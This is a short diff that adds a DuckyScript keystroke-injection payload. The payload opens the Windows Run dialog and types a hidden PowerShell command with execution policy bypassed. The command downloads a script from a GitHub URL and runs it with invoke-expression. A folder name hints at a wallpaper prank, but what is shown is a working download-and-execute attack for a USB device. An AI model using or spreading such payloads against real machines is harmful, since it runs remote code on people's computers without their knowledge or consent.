@@ -1,0 +1,5 @@
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://github.com/magnaproeu/githubTest/blob/0624998bbd230beabf3721ddbf08886822c793aa/Delfin/DuckyScript/Wallpaper_From_WWW/wallpaper_url.ps1?dl=1; invoke-expression $pl
+DELAY 500
+ENTER
